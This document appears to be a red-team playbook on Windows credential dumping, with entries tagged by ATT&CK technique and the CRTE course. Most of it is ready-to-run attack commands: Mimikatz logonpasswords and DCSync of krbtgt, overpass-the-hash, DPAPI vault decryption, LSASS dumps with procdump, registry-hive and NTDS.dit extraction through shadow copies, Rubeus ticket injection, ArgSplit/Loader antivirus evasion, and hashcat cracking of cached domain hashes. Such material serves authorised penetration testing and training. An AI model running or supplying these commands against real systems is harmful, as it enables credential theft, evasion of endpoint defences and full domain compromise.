# Credential Dumping — Local Extraction

## Mimikatz Core Dumps

### Standard Credential Harvest (Mimikatz on Box) [added: 2026-04]
- **Tags:** #Mimikatz #sekurlsa #logonpasswords #NTLM #WDigest #CredentialDumping #T1003.001
- **Trigger:** Local admin or SYSTEM on Windows host; need to dump in-memory credentials
- **Prereq:** Local admin or SYSTEM privileges, Mimikatz or SafetyKatz on target, SeDebugPrivilege
- **Yields:** NTLM hashes, Kerberos tickets, cleartext passwords (if WDigest enabled), domain cached credentials
- **Opsec:** High
- **Context:** Local admin or SYSTEM on Windows host — dump all in-memory credentials
- **Payload/Method:**
  ```
  privilege::debug

  # Logon passwords (cleartext where WDigest enabled, NTLM hashes)
  sekurlsa::logonpasswords

  # All domain hashes from DC (noisy — patches LSASS)
  lsadump::lsa /patch

  # Local SAM hashes only
  lsadump::sam

  # DCSync (requires Replication rights, no LSASS touch)
  lsadump::dcsync /user:domain\krbtgt /domain:domain.local
  lsadump::dcsync /user:domain\administrator /domain:domain.local
  ```

### Overpass-the-Hash (NTLM → Kerberos TGT) [added: 2026-04]
- **Tags:** #OverPassTheHash #OPtH #Mimikatz #NTLM #Kerberos #TGT #T1550.002
- **Trigger:** Have NTLM hash of target user; want Kerberos-based access instead of NTLM (avoids NTLM detections)
- **Prereq:** NTLM hash of target user, Mimikatz on host with SeDebugPrivilege
- **Yields:** New process running as target user with valid Kerberos TGT (full Kerberos auth)
- **Opsec:** Med
- **Context:** Have NTLM hash but want Kerberos ticket (avoids NTLM-based detections)
- **Payload/Method:**
  ```
  sekurlsa::pth /user:Administrator /domain:domain.local \
    /ntlm:<NTLM-hash> /run:powershell.exe
  # New PowerShell window runs as that user with full Kerberos support
  ```

## DPAPI — Credential Manager & Scheduled Task Secrets

### DPAPI Credential Manager Dump [added: 2026-04]
- **Tags:** #DPAPI #CredentialManager #VaultDump #MasterKey #ScheduledTasks #CredentialAccess #T1555.004
- **Trigger:** Local admin on host; need to extract saved credentials (scheduled tasks, network passwords, browser passwords)
- **Prereq:** Local admin privileges, Mimikatz available, access to user profile directories
- **Yields:** Plaintext credentials from Credential Manager (saved passwords, scheduled task creds, network creds)
- **Opsec:** Med
- **Context:** Have local admin — dump saved credentials (scheduled tasks, network passwords, etc.)
- **Payload/Method:**
  ```
  # List stored credentials
  vault::list
  vault::cred /patch

  # Stealth DPAPI method (no special rights, less noise):
  # Step 1: Get GUID of master key for specific credential blob
  dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<GUID>

  # Step 2a: Grab DPAPI keys from LSASS
  sekurlsa::dpapi

  # Step 2b (alternative): Request master key via RPC (domain context)
  dpapi::masterkey /rpc /in:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<key-GUID>
  # Mimikatz caches the key (verify: dpapi::cache)

  # Step 3: Re-run dpapi::cred — now decrypts automatically
  dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<GUID>
  ```

## LSASS Dump Without Mimikatz on Target

### procdump → Remote Mimikatz Parse [added: 2026-04]
- **Tags:** #procdump #LSASS #OfflineParse #AVEvasion #MemoryDump #Mimikatz #T1003.001
- **Trigger:** Endpoint AV blocks Mimikatz; need to dump LSASS and parse offline
- **Prereq:** Local admin on target, procdump.exe (Sysinternals) available, Mimikatz on attacker machine
- **Yields:** Full LSASS memory dump for offline credential extraction (NTLM hashes, Kerberos tickets)
- **Opsec:** Med
- **Context:** Endpoint AV blocks Mimikatz — dump LSASS memory to file, parse offline
- **Payload/Method:**
  ```powershell
  # On target: dump LSASS via process snapshot (avoids opening lsass handle directly)
  .\procdump.exe -r -ma lsass.exe lsass.dmp

  # Transfer lsass.dmp to attacker machine
  # On attacker (Mimikatz):
  sekurlsa::minidump lsass.dmp
  sekurlsa::logonpasswords
  ```

### Registry Hive Dump → Offline secretsdump [added: 2026-04]
- **Tags:** #RegistryHive #SAM #SYSTEM #SECURITY #secretsdump #Impacket #OfflineDump #T1003.002
- **Trigger:** Local admin on host; AV blocks LSASS access; registry hives are not locked
- **Prereq:** Local admin privileges, reg.exe access, impacket-secretsdump on attacker machine
- **Yields:** Local SAM hashes, LSA secrets, cached domain credentials via offline parsing
- **Opsec:** Low
- **Context:** Local admin — save registry hives (not locked), parse offline with Impacket
- **Payload/Method:**
  ```powershell
  # Save hives to disk (requires admin, hives not locked unlike NTDS.dit)
  reg.exe save hklm\sam    C:\users\public\sam.save
  reg.exe save hklm\system C:\users\public\system.save
  reg.exe save hklm\security C:\users\public\security.save

  # Transfer files to attacker, then parse:
  impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
  ```

### Volume Shadow Copy — NTDS.dit Extraction [added: 2026-04]
- **Tags:** #VSS #VolumeShadowCopy #NTDSdit #DCDump #secretsdump #DomainHashes #T1003.003
- **Trigger:** Admin on DC; need to extract NTDS.dit which is locked by AD; VSS snapshot bypasses lock
- **Prereq:** Admin/SYSTEM on Domain Controller, wmic available, impacket-secretsdump on attacker
- **Yields:** Full domain hash database (all user NTLM hashes) via NTDS.dit offline extraction
- **Opsec:** High
- **Context:** On DC with admin — copy locked NTDS.dit via VSS snapshot
- **Payload/Method:**
  ```powershell
  # Create shadow copy
  wmic shadowcopy call create Volume='C:\'

  # Copy files from shadow
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\public\ntds.dit
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM C:\public\SYSTEM

  # Parse offline
  impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
  ```

## OpSec-Safe Credential Dumps (CRTE)

### Over-Pass-The-Hash with AES256 via Rubeus /opsec (CRTE) [added: 2026-04]
- **Tags:** #OverPassTheHash #OPtH #Rubeus #AES256 #Kerberos #OpSec #T1550.002
- **Trigger:** AES256 key obtained from SafetyKatz dump; need stealthy Kerberos auth without touching LSASS
- **Prereq:** AES256 key of target user, Rubeus.exe available, Loader.exe for AV bypass
- **Yields:** Isolated process with injected TGT for target user (full Kerberos auth without LSASS touch)
- **Opsec:** Low
- **Context:** Have AES256 key (from SafetyKatz dump). Use Rubeus for OpSec-safe OPtH — creates a new logon session and injects TGT without touching LSASS directly.
- **Payload/Method:**
  ```
  # Dump AES keys first
  Loader.exe -path SafetyKatz.exe -args "sekurlsa::keys" "exit"

  # OPtH with AES256 — creates isolated cmd.exe process with TGT injected
  Loader.exe -path Rubeus.exe -args asktgt /user:<USER> /aes256:<AES256KEY> /domain:<DOMAIN> /opsec /createnetonly:C:\windows\system32\cmd.exe /show /ptt
  ```

### ArgSplit.bat + Loader.exe — AV-Safe SafetyKatz Execution (CRTE) [added: 2026-04]
- **Tags:** #ArgSplit #Loader #SafetyKatz #AVEvasion #EncodedArgs #Mimikatz #T1027
- **Trigger:** AV blocks known Mimikatz argument strings; need encoded argument delivery
- **Prereq:** ArgSplit.bat and Loader.exe available on target, SafetyKatz hosted on C2/web server
- **Yields:** Mimikatz credential dump executed via encoded arguments bypassing AV string detection
- **Opsec:** Med
- **Context:** AV blocks known argument strings like "sekurlsa::logonpasswords". ArgSplit.bat encodes the argument string into env var %Pwn%, then Loader.exe passes it to SafetyKatz in-memory.
- **Payload/Method:**
  ```
  # Step 1: Encode the dump method via ArgSplit
  ArgSplit.bat   # Interactive — type the method (e.g., sekurlsa::logonpasswords), assigns to %Pwn%

  # Step 2: Pass encoded arg to SafetyKatz via Loader
  Loader.exe -path SafetyKatz.exe -args "%Pwn%" "exit"
  ```

### WIM File Offline Secrets Extraction [added: 2026-04]
- **Tags:** #CredentialDumping #WIM #WindowsImaging #secretsdump #OfflineDump #SAM #LSA #CachedCreds
- **Trigger:** SMB share contains `.wim` files; disk images accessible on a network share (imaging/deployment infrastructure)
- **Prereq:** Read access to a share containing `.wim` files; `wimtools` installed on attacker Linux box
- **Yields:** Local SAM hashes, LSA secrets, cached domain logon hashes (DCC2) for users who previously logged on to imaged workstation
- **Opsec:** Low (fully offline, no network auth to target)
- **Context:** Deployment/imaging shares often contain WIM snapshots of workstations. Workstations may have cached domain creds from prior logins that reuse domain passwords.
- **Payload/Method:**
  ```bash
  # Download WIM files from SMB share
  impacket-smbclient -k domain/user:pass@DC.domain.local
  # use images$; mget *

  # Mount the WIM (try each split part; -02 usually has the OS)
  sudo wimmount MACHINE-02.wim /mnt

  # Dump all secrets offline
  impacket-secretsdump -system /mnt/SYSTEM -sam /mnt/SAM -security /mnt/SECURITY local

  # DCC2 cached hash → crack with hashcat mode 2100
  hashcat -m 2100 '$DCC2$10240#user#hash' /usr/share/wordlists/rockyou.txt
  # Or reuse operator/local hash directly against domain user via Pass-the-Hash
  ```
